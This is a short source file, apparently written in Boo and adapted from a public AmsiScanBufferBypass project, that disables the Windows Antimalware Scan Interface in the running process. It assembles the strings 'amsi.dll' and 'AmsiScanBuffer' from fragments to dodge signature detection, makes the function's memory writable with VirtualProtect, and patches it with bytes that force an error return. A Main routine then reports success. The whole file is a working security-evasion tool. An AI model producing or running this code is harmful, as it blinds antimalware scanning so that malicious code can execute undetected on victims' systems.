/*
    This module is adapted from the AmsiScanBufferBypass (https://github.com/rasta-mouse/AmsiScanBufferBypass) by @_RastaMouse
*/
import System
import System.Runtime.InteropServices

[DllImport("kernel32")]
public static def GetProcAddress(hModule as IntPtr, procName as string) as IntPtr:
    pass

[DllImport("kernel32")]
public static def LoadLibrary(name as string) as IntPtr:
    pass

[DllImport("kernel32")]
public static def VirtualProtect(lpAddress as IntPtr, dwSize as UIntPtr, flNewProtect as uint, ref lpflOldProtect as uint) as bool:
    pass


public static def GetStringParts(choice as int) as string:
    if choice == 1:
        return "Ams"
    elif choice == 2:
        return "iSca"
    elif choice == 3:
        return "nBuffer"
    elif choice == 4:
        return "ams"
    elif choice == 5:
        return "i.dll"
    else:
        return ""


public static def Disable():
    Address as IntPtr = GetProcAddress(LoadLibrary(GetStringParts(4) + GetStringParts(5)), GetStringParts(1) + GetStringParts(2) + GetStringParts(3))

    size as UIntPtr
    size = UIntPtr(5)
    p as uint = 0

    VirtualProtect(Address, size, 0x40, p)
    Patch as (byte) = array(byte, (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3))
    Marshal.Copy(Patch, 0, Address, 6)


public static def Main():
    print "[*] Disabling AMSI"
    try:
        Disable()
        print "[+] Successfully disabled AMSI"
    except e:
        print "[-] An error occured: " + e
